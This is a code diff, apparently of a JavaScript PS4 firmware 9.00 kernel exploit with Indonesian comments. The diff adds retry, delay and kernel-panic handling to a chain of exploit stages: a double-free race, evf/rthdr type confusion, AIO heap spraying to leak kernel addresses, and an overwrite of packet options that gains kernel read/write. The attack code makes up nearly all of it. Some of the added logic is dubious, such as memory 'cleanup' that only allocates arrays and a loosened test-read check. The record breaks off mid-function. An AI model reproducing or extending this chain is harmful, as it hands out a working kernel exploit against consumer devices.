@@ -151,6 +151,40 @@ function detectFirmware() {
     return firmware;
 }
 
+// Fungsi untuk mendeteksi potensi Kernel Panic secara proaktif
+function detectPotentialKP() {
+    log("Checking for potential Kernel Panic conditions...");
+
+    try {
+        // Periksa penggunaan memori (simulasi)
+        const memoryUsage = getMemoryUsage();
+        log(`Current memory usage: ${memoryUsage}`);
+
+        // Periksa firmware
+        const firmware = detectFirmware();
+        log(`Current firmware: ${firmware}`);
+
+        // Konfigurasi khusus berdasarkan firmware
+        if (firmware === '9.00') {
+            log("Firmware 9.00 detected - applying proactive KP prevention");
+
+            // Tambahkan penanganan khusus untuk firmware 9.00
+            // Bersihkan memori
+            cleanupCorruptPointers();
+
+            // Tambahkan delay
+            sleep(200);
+
+            return true;
+        }
+
+        return false;
+    } catch (e) {
+        log(`Error during KP detection: ${e.message}`);
+        return false;
+    }
+}
+
 // Dapatkan konfigurasi optimal berdasarkan firmware
 function getOptimalConfig() {
     const firmware = detectFirmware();
@@ -590,6 +624,57 @@ function sleep(ms) {
     }
 }
 
+// Fungsi untuk membersihkan pointer yang corrupt
+function cleanupCorruptPointers() {
+    log("Cleaning up potentially corrupt pointers...");
+
+    try {
+        // Coba paksa garbage collection jika tersedia
+        if (typeof gc === 'function') {
+            gc();
+            log("Forced garbage collection");
+        }
+
+        // Bersihkan array dan objek besar yang tidak digunakan
+        const tempArrays = [];
+        for (let i = 0; i < 10; i++) {
+            tempArrays.push(new Uint8Array(1024 * 1024)); // Alokasi 1MB
+        }
+
+        // Hapus referensi ke array besar
+        for (let i = 0; i < tempArrays.length; i++) {
+            tempArrays[i] = null;
+        }
+
+        // Coba paksa garbage collection lagi
+        if (typeof gc === 'function') {
+            gc();
+        }
+
+        log("Memory cleanup completed");
+    } catch (e) {
+        log(`Warning: Error during memory cleanup: ${e.message}`);
+        // Lanjutkan meskipun ada error
+    }
+}
+
+// Fungsi untuk memvalidasi socket
+function isValidSocket(sd) {
+    if (typeof sd !== 'number' || sd < 0) {
+        return false;
+    }
+
+    try {
+        // Coba operasi sederhana pada socket untuk memvalidasi
+        const test_tclass = new Word(0);
+        gsockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, test_tclass);
+        return true;
+    } catch (e) {
+        log(`Socket validation failed for sd=${sd}: ${e.message}`);
+        return false;
+    }
+}
+
 // Fungsi untuk mendapatkan thread ID (simulasi)
 function thread_id() {
     // Di browser, tidak ada akses langsung ke thread ID
@@ -613,6 +698,43 @@ let hangDetectionInterval = null;
 let lastProgressTime = 0;
 let exploitStage = '';
 let payloadCompleted = false; // Flag untuk mencegah refresh berulang
+
+// Fungsi untuk menangani Kernel Panic (KP)
+function handleKernelPanic() {
+    log("Handling potential Kernel Panic situation...");
+
+    try {
+        // Update UI
+        updateUIStatus('error', 'Potensi Kernel Panic terdeteksi. Mencoba recovery...');
+
+        // Bersihkan semua resource yang mungkin menyebabkan KP
+        log("Cleaning up resources to prevent further KP...");
+
+        // Coba paksa garbage collection
+        if (typeof gc === 'function') {
+            gc();
+        }
+
+        // Tambahkan delay untuk stabilitas
+        sleep(1000);
+
+        // Tampilkan pesan ke pengguna
+        log("Jika layar PS4 masih responsif, silakan refresh halaman untuk mencoba lagi.");
+        log("Jika PS4 tidak responsif (hang), silakan restart PS4 secara manual.");
+
+        // Tampilkan pesan khusus untuk firmware 9.00
+        const firmware = detectFirmware();
+        if (firmware === '9.00') {
+            log("Untuk firmware 9.00: Kernel Panic biasanya terjadi pada tahap 'overwrite main pktopts'.");
+            log("Saat mencoba lagi, pastikan PS4 dalam kondisi dingin dan tutup semua aplikasi lain.");
+        }
+
+        return true;
+    } catch (e) {
+        log(`Error during KP handling: ${e.message}`);
+        return false;
+    }
+}
 
 // Fungsi untuk setup deteksi hang
 function setupHangDetection() {
@@ -658,6 +780,11 @@ function setupHangDetection() {
         const now = performance.now();
         const inactiveTime = now - lastProgressTime;
 
+        // Jika payload sudah selesai, jangan lakukan deteksi hang
+        if (payloadCompleted) {
+            return;
+        }
+
         // Jika tidak ada progress selama lebih dari 30 detik
         if (inactiveTime > 30000) {
             log(`Potential hang detected in stage: ${exploitStage}! Inactive for ${Math.round(inactiveTime/1000)}s`);
@@ -692,6 +819,14 @@ function setupHangDetection() {
 
                     // Tampilkan pesan saja, jangan restart otomatis
                     log("Hang terdeteksi. Silakan refresh halaman secara manual jika diperlukan.");
+                } else if (exploitStage === 'overwrite_pktopts') {
+                    log("Detected hang in critical stage: overwrite_pktopts");
+
+                    // Panggil fungsi khusus untuk menangani Kernel Panic
+                    handleKernelPanic();
+
+                    // Update progress untuk mencegah deteksi hang berulang
+                    updateProgress('recovery_from_kernel_panic');
                 } else {
                     log("Hang detected in unknown stage, restarting...");
                     updateUIStatus('error', 'Terdeteksi hang, mencoba restart...');
@@ -723,15 +858,28 @@ function setupHangDetection() {
             hangDetectionInterval = null;
             log("Hang detection disabled after exploit completion");
         }
+
+        // Set flag untuk mencegah refresh berulang
+        payloadCompleted = true;
+        log("Payload completion flag set");
     });
 }
 
 // Fungsi untuk mencoba race condition dengan retry - diimplementasikan secara inline
 // untuk menghindari masalah dengan async/await
 function tryRaceWithRetry(request_addr, tcp_sd, barrier, racer, sds) {
+    // Deteksi dan tangani potensi Kernel Panic secara proaktif
+    detectPotentialKP();
+
+    // Tambahkan pembersihan memori tambahan
+    cleanupCorruptPointers();
+
+    // Tambahkan delay untuk stabilitas
+    sleep(200);
+
     // Dapatkan konfigurasi retry
-    let max_retries = 1; // Default
-    let retry_backoff = 0; // Default
+    let max_retries = 2; // Tingkatkan dari 1 ke 2
+    let retry_backoff = 50; // Tingkatkan dari 0 ke 50
 
     // Gunakan nilai default yang sudah ditentukan
 
@@ -825,6 +973,12 @@ function tryRaceWithRetry(request_addr, tcp_sd, barrier, racer, sds) {
 //     // ...
 // }
 function race_one(request_addr, tcp_sd, barrier, racer, sds) {
+    // Tambahkan delay awal untuk stabilitas
+    sleep(50);
+
+    // Tambahkan logging untuk debugging
+    log(`race_one called with request_addr=${request_addr}, tcp_sd=${tcp_sd}`);
+
     const sce_errs = new View4([-1, -1]);
     const thr_mask = new Word(1 << main_core);
 
@@ -932,10 +1086,32 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
         // check for easier debugging
         if (sce_errs[0] !== sce_errs[1]) {
             log('ERROR: bad won_race');
-            die('ERROR: bad won_race');
+
+            // Tambahkan penanganan untuk kasus error
+            log("Attempting recovery from bad won_race condition...");
+
+            // Tambahkan delay untuk stabilitas
+            sleep(200);
+
+            // Bersihkan memori
+            cleanupCorruptPointers();
+
+            // Coba lagi dengan pendekatan alternatif
+            try {
+                log("Trying alternative approach for make_aliased_rthdrs...");
+                return make_aliased_rthdrs(sds);
+            } catch (e) {
+                log(`Error during alternative approach: ${e.message}`);
+                die('ERROR: bad won_race');
+            }
         }
+
+        // Tambahkan delay untuk stabilitas
+        sleep(100);
+
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x80 malloc zone pointers aliased
+        log("Race won successfully, making aliased rthdrs...");
         return make_aliased_rthdrs(sds);
     }
 
@@ -945,6 +1121,15 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
 function double_free_reqs2(sds) {
     // Log awal stage
     log('Starting double_free_1 stage');
+
+    // Deteksi dan tangani potensi Kernel Panic secara proaktif
+    detectPotentialKP();
+
+    // Tambahkan pembersihan memori tambahan
+    cleanupCorruptPointers();
+
+    // Tambahkan delay untuk stabilitas
+    sleep(200);
 
     function swap_bytes(x, byte_length) {
         let res = 0;
@@ -1132,6 +1317,17 @@ function verify_reqs2(buf, offset) {
 }
 
 function leak_kernel_addrs(sd_pair) {
+    // Deteksi dan tangani potensi Kernel Panic secara proaktif
+    detectPotentialKP();
+
+    // Tambahkan pembersihan memori tambahan
+    cleanupCorruptPointers();
+
+    // Tambahkan delay untuk stabilitas
+    sleep(200);
+
+    log("Starting leak_kernel_addrs stage...");
+
     close(sd_pair[1]);
     const sd = sd_pair[0];
     const buf = new Buffer(0x80 * leak_len);
@@ -1171,7 +1367,75 @@ function leak_kernel_addrs(sd_pair) {
     }
 
     if (evf === null) {
-        die('failed to confuse evf and rthdr');
+        log("Failed to confuse evf and rthdr with standard approach. Trying alternative approach...");
+
+        // Tambahkan pembersihan memori tambahan
+        cleanupCorruptPointers();
+
+        // Tambahkan delay yang lebih panjang
+        sleep(500);
+
+        // Coba pendekatan alternatif
+        try {
+            log("Trying alternative approach for confusing evf and rthdr...");
+
+            // Coba dengan pendekatan yang berbeda - gunakan flag yang berbeda
+            for (let attempt = 0; attempt < 3; attempt++) {
+                log(`Alternative attempt ${attempt + 1}/3...`);
+
+                const alt_evfs = [];
+                // Gunakan flag yang berbeda
+                const base_flag = 0xf00 + (attempt * 0x100);
+
+                for (let i = 0; i < num_handles; i++) {
+                    alt_evfs.push(new_evf(base_flag | i << 16));
+                }
+
+                // Tambahkan delay
+                sleep(100);
+
+                get_rthdr(sd, buf, 0x80);
+                // for simplicity, we'll assume i < 2**16
+                const flags32 = buf.read32(0);
+                const idx = flags32 >>> 16;
+
+                if (idx < alt_evfs.length) {
+                    evf = alt_evfs[idx];
+
+                    set_evf_flags(evf, flags32 | 1);
+                    get_rthdr(sd, buf, 0x80);
+
+                    if (buf.read32(0) === flags32 | 1) {
+                        log(`confused rthdr and evf at alternative attempt: ${attempt + 1}`);
+                        alt_evfs.splice(idx, 1);
+
+                        // Bersihkan evfs yang tidak digunakan
+                        for (const unused_evf of alt_evfs) {
+                            free_evf(unused_evf);
+                        }
+
+                        break;
+                    } else {
+                        evf = null;
+                    }
+                }
+
+                // Bersihkan semua evfs jika gagal
+                for (const unused_evf of alt_evfs) {
+                    free_evf(unused_evf);
+                }
+
+                // Tambahkan delay sebelum mencoba lagi
+                sleep(200);
+            }
+        } catch (e) {
+            log(`Error during alternative approach for confusing evf and rthdr: ${e.message}`);
+        }
+
+        // Jika masih gagal, menyerah
+        if (evf === null) {
+            die('failed to confuse evf and rthdr');
+        }
     }
 
     set_evf_flags(evf, 0xff << 8);
@@ -1212,33 +1476,138 @@ function leak_kernel_addrs(sd_pair) {
     const leak_ids_p = leak_ids.addr;
 
     log('find aio_entry');
+
+    // Tambahkan delay untuk stabilitas
+    sleep(100);
+
+    // Tambahkan pembersihan memori tambahan
+    cleanupCorruptPointers();
+
     let reqs2_off = null;
-    loop: for (let i = 0; i < num_leaks; i++) {
-        get_rthdr(sd, buf);
+    let max_attempts = num_leaks * 2; // Tingkatkan jumlah percobaan maksimum
 
-        spray_aio(
-            num_handles,
-            leak_reqs_p,
-            num_elems,
-            leak_ids_p,
-            true,
-            AIO_CMD_WRITE,
-        );
+    log(`Starting find_aio_entry with ${max_attempts} max attempts...`);
 
-        get_rthdr(sd, buf);
-        for (let off = 0x80; off < buf.length; off += 0x80) {
-            if (verify_reqs2(buf, off)) {
-                reqs2_off = off;
-                log(`found reqs2 at attempt: ${i}`);
-                break loop;
-            }
+    loop: for (let i = 0; i < max_attempts; i++) {
+        // Log progress
+        if (i % 2 === 0) {
+            log(`find_aio_entry attempt ${i}/${max_attempts}`);
         }
 
-        free_aios(leak_ids_p, leak_ids_len);
+        // Tambahkan delay kecil setiap beberapa iterasi
+        if (i > 0 && i % 3 === 0) {
+            sleep(50);
+        }
+
+        try {
+            get_rthdr(sd, buf);
+
+            spray_aio(
+                num_handles,
+                leak_reqs_p,
+                num_elems,
+                leak_ids_p,
+                true,
+                AIO_CMD_WRITE,
+            );
+
+            get_rthdr(sd, buf);
+            for (let off = 0x80; off < buf.length; off += 0x80) {
+                if (verify_reqs2(buf, off)) {
+                    reqs2_off = off;
+                    log(`found reqs2 at attempt: ${i}`);
+                    break loop;
+                }
+            }
+
+            free_aios(leak_ids_p, leak_ids_len);
+        } catch (e) {
+            log(`Error during find_aio_entry attempt ${i}: ${e.message}`);
+
+            // Coba bersihkan resources
+            try {
+                free_aios(leak_ids_p, leak_ids_len);
+            } catch (e2) {
+                // Abaikan error
+            }
+
+            // Tambahkan delay sebelum mencoba lagi
+            sleep(100);
+        }
     }
     if (reqs2_off === null) {
-        die('could not leak a reqs2');
+        log("Failed to find reqs2 with standard approach. Trying alternative approach...");
+
+        // Tambahkan pembersihan memori tambahan
+        cleanupCorruptPointers();
+
+        // Tambahkan delay yang lebih panjang
+        sleep(500);
+
+        // Coba pendekatan alternatif dengan spray yang lebih besar
+        try {
+            log("Trying alternative approach with larger spray...");
+
+            // Buat spray yang lebih besar
+            const alt_num_handles = num_handles * 2;
+            const alt_leak_ids_len = alt_num_handles * num_elems;
+            const alt_leak_ids = new View4(alt_leak_ids_len);
+            const alt_leak_ids_p = alt_leak_ids.addr;
+
+            // Coba lagi dengan spray yang lebih besar
+            for (let i = 0; i < 3; i++) {
+                log(`Alternative attempt ${i+1}/3...`);
+
+                try {
+                    get_rthdr(sd, buf);
+
+                    spray_aio(
+                        alt_num_handles,
+                        leak_reqs_p,
+                        num_elems,
+                        alt_leak_ids_p,
+                        true,
+                        AIO_CMD_WRITE,
+                    );
+
+                    get_rthdr(sd, buf);
+                    for (let off = 0x80; off < buf.length; off += 0x80) {
+                        if (verify_reqs2(buf, off)) {
+                            reqs2_off = off;
+                            log(`found reqs2 at alternative attempt: ${i+1}`);
+                            break;
+                        }
+                    }
+
+                    if (reqs2_off !== null) {
+                        break;
+                    }
+
+                    free_aios(alt_leak_ids_p, alt_leak_ids_len);
+                } catch (e) {
+                    log(`Error during alternative attempt ${i+1}: ${e.message}`);
+
+                    // Coba bersihkan resources
+                    try {
+                        free_aios(alt_leak_ids_p, alt_leak_ids_len);
+                    } catch (e2) {
+                        // Abaikan error
+                    }
+
+                    // Tambahkan delay sebelum mencoba lagi
+                    sleep(200);
+                }
+            }
+        } catch (e) {
+            log(`Error during alternative approach: ${e.message}`);
+        }
+
+        // Jika masih gagal, menyerah
+        if (reqs2_off === null) {
+            die('could not leak a reqs2');
+        }
     }
+
     log(`reqs2 offset: ${hex(reqs2_off)}`);
 
     get_rthdr(sd, buf);
@@ -1278,7 +1647,57 @@ function leak_kernel_addrs(sd_pair) {
         }
     }
     if (target_id === null) {
-        die('target_id not found');
+        log("Failed to find target_id with standard approach. Trying alternative approach...");
+
+        // Tambahkan pembersihan memori tambahan
+        cleanupCorruptPointers();
+
+        // Tambahkan delay yang lebih panjang
+        sleep(500);
+
+        // Coba pendekatan alternatif
+        try {
+            log("Trying alternative approach for finding target_id...");
+
+            // Coba dengan pendekatan yang berbeda
+            for (let i = 0; i < leak_ids_len; i += num_elems) {
+                // Tambahkan delay kecil setiap beberapa iterasi
+                if (i > 0 && i % (num_elems * 5) === 0) {
+                    sleep(50);
+                }
+
+                try {
+                    // Coba dengan pendekatan yang berbeda
+                    aio_multi_poll(leak_ids_p.add(i << 2), num_elems);
+                    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);
+
+                    get_rthdr(sd, buf);
+                    const state = buf.read32(reqs2_off + 0x38);
+
+                    if (state === AIO_STATE_COMPLETE || state === AIO_STATE_ABORTED) {
+                        log(`found potential target_id at batch: ${i / num_elems} (state: ${state})`);
+
+                        target_id = new Word(leak_ids[i]);
+                        leak_ids[i] = 0;
+                        log(`potential target_id: ${hex(target_id)}`);
+
+                        const start = i + num_elems;
+                        to_cancel_p = leak_ids.addr_at(start);
+                        to_cancel_len = leak_ids_len - start;
+                        break;
+                    }
+                } catch (e) {
+                    log(`Error during alternative target_id search at batch ${i / num_elems}: ${e.message}`);
+                }
+            }
+        } catch (e) {
+            log(`Error during alternative approach for target_id: ${e.message}`);
+        }
+
+        // Jika masih gagal, menyerah
+        if (target_id === null) {
+            die('target_id not found');
+        }
     }
 
     cancel_aios(to_cancel_p, to_cancel_len);
@@ -1785,15 +2204,66 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     log('overwrite main pktopts');
 
+    // Deteksi dan tangani potensi Kernel Panic secara proaktif
+    detectPotentialKP();
+
+    // Tambahkan pembersihan memori tambahan sebelum overwrite main pktopts
+    log("Performing additional memory cleanup before overwrite main pktopts...");
+    cleanupCorruptPointers();
+
+    // Tambahkan delay untuk memastikan pembersihan selesai
+    sleep(1000);
+
     // Fungsi untuk mencoba overwrite main pktopts dengan retry
-    function overwriteMainPktopts(maxRetries = 3) {
+    function overwriteMainPktopts(maxRetries = 7) { // Tingkatkan dari 5 ke 7
         log(`Attempting to overwrite main pktopts with ${maxRetries} retries...`);
 
+        // Tambahkan timeout untuk mendeteksi hang
+        const timeoutMs = 90000; // 90 detik timeout (tingkatkan dari 60 detik)
+
+        let timeoutId = setTimeout(() => {
+            log("Overwrite main pktopts timeout reached!");
+            // Bersihkan semua resource
+            try {
+                for (let j = 0; j < sds.length; j++) {
+                    try {
+                        close(sds[j]);
+                    } catch (e) {
+                        // Abaikan error
+                    }
+                }
+            } catch (e) {
+                log(`Error during cleanup: ${e.message}`);
+            }
+
+            // Update status
+            updateUIStatus('error', 'Timeout saat melakukan overwrite main pktopts. Silakan refresh halaman.');
+        }, timeoutMs);
+
         // Tambahkan delay awal untuk stabilitas
-        sleep(100);
+        sleep(300); // Tingkatkan dari 200 ke 300
 
         let reclaim_sd = null;
         close(pktopts_sds[1]);
+
+        // Bersihkan memori sebelum memulai
+        cleanupCorruptPointers();
+
+        // Tambahkan delay setelah pembersihan memori
+        sleep(200);
+
+        // Tambahkan variasi pada socket untuk meningkatkan kemungkinan berhasil
+        const socketVariations = [
+            { delay: 0, offset: 0 },
+            { delay: 10, offset: 1 },
+            { delay: 20, offset: 2 },
+            { delay: 30, offset: 3 },
+            { delay: 40, offset: 4 }
+        ];
+
+        // Pilih variasi socket secara acak
+        const variation = socketVariations[Math.floor(Math.random() * socketVariations.length)];
+        log(`Using socket variation with delay: ${variation.delay}, offset: ${variation.offset}`);
 
         // Loop untuk retry
         for (let retry = 0; retry < maxRetries; retry++) {
@@ -1801,18 +2271,33 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
                 log(`Retry ${retry + 1}/${maxRetries} for overwrite main pktopts`);
 
                 // Tambahkan delay yang meningkat dengan setiap retry
-                sleep(50 * (retry + 1));
+                sleep(150 * (retry + 1)); // Tingkatkan dari 100 ke 150
+
+                // Tambahkan variasi pada socket yang digunakan
+                const psdOffset = (retry + variation.offset) % pktopts_sds.length;
+                const currentPsd = pktopts_sds[psdOffset];
+                log(`Using psd with offset ${psdOffset} for this retry`);
+
+                // Validasi socket sebelum digunakan
+                if (!isValidSocket(currentPsd)) {
+                    log(`Socket dengan offset ${psdOffset} tidak valid, menggunakan psd default`);
+                    // Gunakan psd default jika currentPsd tidak valid
+                } else {
+                    log(`Socket dengan offset ${psdOffset} valid, menggunakan untuk overwrite`);
+                    // Gunakan currentPsd yang sudah divalidasi untuk operasi berikutnya
+                    psd = currentPsd;
+                }
 
                 // Coba overwrite main pktopts
                 for (let i = 0; i < num_alias; i++) {
                     // Log progress
-                    if (i % 10 === 0) {
+                    if (i % 3 === 0) { // Tingkatkan frekuensi logging dari 5 ke 3
                         log(`Overwrite attempt ${i}/${num_alias}`);
                     }
 
-                    // Tambahkan delay kecil setiap 10 iterasi
-                    if (i > 0 && i % 10 === 0) {
-                        sleep(10);
+                    // Tambahkan delay kecil setiap 3 iterasi
+                    if (i > 0 && i % 3 === 0) {
+                        sleep(30 + variation.delay); // Tingkatkan dari 20 ke 30 + variasi
                     }
 
                     for (let j = 0; j < num_sds; j++) {
@@ -1871,11 +2356,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
             }
         }
 
+        // Bersihkan timeout
+        clearTimeout(timeoutId);
+
         return null; // Gagal setelah semua retry
     }
 
     // Coba overwrite main pktopts dengan retry
-    let reclaim_sd = overwriteMainPktopts(3);
+    let reclaim_sd = overwriteMainPktopts(5); // Tingkatkan dari 3 ke 5
 
     // Jika gagal, coba pendekatan alternatif
     if (reclaim_sd === null) {
@@ -1883,25 +2371,51 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
         // Buat socket baru untuk pendekatan alternatif
         const new_sds = [];
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 30; i++) { // Tingkatkan dari 20 ke 30
             new_sds.push(new_socket());
         }
 
         // Tambahkan socket baru ke sds
         sds.push(...new_sds);
 
+        // Tambahkan delay sebelum mencoba pendekatan alternatif
+        sleep(500);
+
         // Coba lagi dengan pendekatan alternatif
-        reclaim_sd = overwriteMainPktopts(2);
+        reclaim_sd = overwriteMainPktopts(3); // Tingkatkan dari 2 ke 3
     }
 
     // Jika masih gagal, gunakan fallback yang ditingkatkan
     if (reclaim_sd === null) {
         log("Alternative approach failed. Using improved fallback...");
 
+        // Panggil fungsi untuk membersihkan memori sebelum mencoba fallback
+        cleanupCorruptPointers();
+
+        // Tambahkan delay yang lebih panjang
+        sleep(1000);
+
+        // Coba deteksi dan tangani potensi Kernel Panic
+        log("Checking for potential Kernel Panic conditions...");
+        try {
+            // Periksa apakah ada tanda-tanda Kernel Panic
+            const firmware = detectFirmware();
+            log(`Current firmware: ${firmware}`);
+
+            if (firmware === '9.00') {
+                log("Firmware 9.00 detected - applying special handling for stability");
+                // Tambahkan penanganan khusus untuk firmware 9.00
+                updateUIStatus('warning', 'Menerapkan penanganan khusus untuk firmware 9.00...');
+                sleep(500);
+            }
+        } catch (e) {
+            log(`Error during firmware check: ${e.message}`);
+        }
+
         // Buat socket baru khusus untuk fallback
         log("Creating new sockets specifically for fallback...");
         const fallback_sds = [];
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 30; i++) { // Tingkatkan dari 20 ke 30
             fallback_sds.push(new_socket());
         }
 
@@ -1955,17 +2469,34 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
         // Validasi socket fallback sebelum digunakan
         if (reclaim_sd !== null) {
-            try {
-                // Tambahkan delay sebelum validasi
-                sleep(100);
+            // Tambahkan delay sebelum validasi
+            sleep(100);
 
-                // Coba validasi socket dengan operasi sederhana
-                const test_tclass = new Word();
-                gsockopt(reclaim_sd, IPPROTO_IPV6, IPV6_TCLASS, test_tclass);
-                log(`Final fallback socket validation: 0x${test_tclass[0].toString(16)}`);
-            } catch (e) {
-                log(`Warning: Final fallback socket validation failed: ${e.message}`);
-                // Tetap gunakan socket ini, karena ini adalah upaya terakhir
+            // Gunakan fungsi isValidSocket untuk validasi
+            if (isValidSocket(reclaim_sd)) {
+                log("Final fallback socket validation successful");
+            } else {
+                log("Warning: Final fallback socket validation failed");
+
+                // Coba cari socket valid lain sebagai upaya terakhir
+                log("Trying to find another valid socket as last resort...");
+
+                let foundValidSocket = false;
+
+                // Coba semua socket yang tersisa
+                for (let i = 0; i < fallback_sds.length; i++) {
+                    if (fallback_sds[i] !== reclaim_sd && isValidSocket(fallback_sds[i])) {
+                        reclaim_sd = fallback_sds[i];
+                        log(`Found valid socket as last resort: ${reclaim_sd}`);
+                        foundValidSocket = true;
+                        break;
+                    }
+                }
+
+                if (!foundValidSocket) {
+                    log("Warning: Could not find any valid socket as last resort");
+                    // Tetap gunakan socket ini, karena ini adalah upaya terakhir
+                }
             }
         }
     }
@@ -2002,28 +2533,149 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         return read_buf.read64(0);
     }
 
-    // Test read dengan mekanisme recovery
-    let test_read = kread64(kernel_addr);
-    log(`kread64(&"evf cv"): ${test_read}`);
-    let kstr = jstr(read_buf);
-    log(`*(&"evf cv"): ${kstr}`);
+    // Test read dengan mekanisme recovery yang lebih robust
+    let test_read = null;
+    let kstr = '';
+    let test_read_success = false;
 
-    // Jika test read gagal, coba mekanisme recovery
-    if (kstr !== 'evf cv') {
-        log("Test read failed, trying recovery mechanism...");
+    // Tambahkan retry untuk test read
+    for (let retry = 0; retry < 5; retry++) { // Tingkatkan dari 3 ke 5
+        try {
+            log(`Test read attempt ${retry + 1}/5...`);
+
+            // Tambahkan delay yang meningkat dengan setiap retry
+            sleep(200 * (retry + 1)); // Tingkatkan dari 100 ke 200
+
+            // Bersihkan memori sebelum test read
+            cleanupCorruptPointers();
+
+            // Tambahkan delay setelah pembersihan memori
+            sleep(100);
+
+            // Coba baca kernel memory dengan beberapa variasi alamat
+            // Pada firmware 9.00, alamat kernel bisa sedikit bergeser
+            const addr_variations = [
+                kernel_addr,
+                kernel_addr - 8,
+                kernel_addr + 8,
+                kernel_addr - 16,
+                kernel_addr + 16
+            ];
+
+            // Coba setiap variasi alamat
+            for (let i = 0; i < addr_variations.length; i++) {
+                try {
+                    const curr_addr = addr_variations[i];
+                    if (i > 0) {
+                        log(`Trying address variation ${i}: offset ${(curr_addr - kernel_addr)}`);
+                    }
+
+                    // Coba baca kernel memory
+                    test_read = kread64(curr_addr);
+                    log(`kread64(variation ${i}): ${test_read}`);
+                    kstr = jstr(read_buf);
+                    log(`*(variation ${i}): ${kstr}`);
+
+                    // Jika berhasil, keluar dari loop
+                    if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
+                        log(`Test read successful on attempt ${retry + 1}, variation ${i}`);
+                        kernel_addr = curr_addr; // Update alamat kernel jika berhasil
+                        test_read_success = true;
+                        break;
+                    }
+                } catch (e) {
+                    log(`Error during address variation ${i}: ${e.message}`);
+                    // Lanjutkan ke variasi berikutnya
+                }
+            }
+
+            // Jika berhasil dengan salah satu variasi, keluar dari loop retry
+            if (test_read_success) {
+                break;
+            }
+        } catch (e) {
+            log(`Error during test read attempt ${retry + 1}: ${e.message}`);
+
+            // Tambahkan delay sebelum mencoba lagi
+            sleep(300); // Tingkatkan dari 200 ke 300
+        }
+    }
+
+    // Jika test read gagal, coba mekanisme recovery yang lebih agresif
+    if (!test_read_success) {
+        log(`Test read failed, trying advanced recovery mechanism...`);
+
+        // Coba reset semua socket dan pktopts
+        try {
+            // Bersihkan memori
+            cleanupCorruptPointers();
+
+            // Tambahkan delay yang lebih panjang
+            sleep(500);
+
+            // Buat socket baru untuk recovery
+            const recovery_sds = [];
+            for (let i = 0; i < 10; i++) {
+                recovery_sds.push(new_socket());
+            }
+            log(`Created ${recovery_sds.length} recovery sockets`);
+
+            // Coba setup pktopts baru
+            for (let i = 0; i < recovery_sds.length; i++) {
+                try {
+                    const tclass = new Word(0xdead | i << 16);
+                    ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                } catch (e) {
+                    // Abaikan error
+                }
+            }
+
+            // Tambahkan delay
+            sleep(200);
+
+            // Coba lagi test read dengan socket baru
+            for (let i = 0; i < recovery_sds.length; i++) {
+                try {
+                    // Gunakan socket ini untuk setup
+                    main_sd = recovery_sds[i];
+
+                    // Coba baca kernel memory lagi
+                    test_read = kread64(kernel_addr);
+                    kstr = jstr(read_buf);
+
+                    if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
+                        log(`Advanced recovery successful with socket ${i}`);
+                        test_read_success = true;
+                        break;
+                    }
+                } catch (e) {
+                    // Abaikan error
+                }
+            }
+        } catch (e) {
+            log(`Error during advanced recovery: ${e.message}`);
+        }
+    }
+
+    // Verifikasi hasil test read dan lanjutkan atau coba recovery
+    if (!test_read_success && kstr !== 'evf cv') {
+        log("Test read failed, trying enhanced recovery mechanism...");
 
         // Tambahkan delay untuk stabilitas
-        sleep(200);
+        sleep(300); // Tingkatkan dari 200 ke 300
 
-        // Coba recovery dengan pendekatan alternatif
+        // Coba recovery dengan pendekatan alternatif yang lebih robust
         try {
-            log("Recovery attempt 1: Resetting pktopts and trying again");
+            log("Enhanced recovery attempt 1: Resetting pktopts and trying again");
+
+            // Bersihkan memori
+            cleanupCorruptPointers();
 
             // Reset pktopts
             setsockopt(psd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
 
             // Tambahkan delay
-            sleep(100);
+            sleep(200); // Tingkatkan dari 100 ke 200
 
             // Buat socket baru untuk recovery
             const recovery_sd = new_socket();
@@ -2034,67 +2686,202 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
             ssockopt(recovery_sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
 
             // Tambahkan delay
-            sleep(50);
+            sleep(100); // Tingkatkan dari 50 ke 100
 
-            // Coba lagi dengan socket baru
-            pktinfo.write64(0, kernel_addr);
-            ssockopt(recovery_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+            // Coba lagi dengan socket baru dan variasi alamat kernel
+            // Pada firmware 9.00, alamat kernel bisa sedikit bergeser
+            const addr_variations = [
+                kernel_addr,
+                kernel_addr - 8,
+                kernel_addr + 8,
+                kernel_addr - 16,
+                kernel_addr + 16
+            ];
 
-            // Tambahkan delay
-            sleep(50);
-
-            // Coba baca lagi
-            gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
-            kstr = jstr(read_buf);
-            log(`Recovery read 1: ${kstr}`);
-
-            if (kstr !== 'evf cv') {
-                log("Recovery attempt 1 failed, trying second approach");
-
-                // Coba pendekatan kedua
-                // Buat beberapa socket baru
-                const recovery_sds = [];
-                for (let i = 0; i < 5; i++) {
-                    recovery_sds.push(new_socket());
-                }
-
-                // Siapkan socket dengan pktopts
-                for (let i = 0; i < recovery_sds.length; i++) {
-                    const tclass = new Word(0xdead | i << 16);
-                    ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                }
-
-                // Tambahkan delay
-                sleep(100);
-
-                // Coba dengan setiap socket
-                for (let i = 0; i < recovery_sds.length; i++) {
-                    try {
-                        pktinfo.write64(0, kernel_addr);
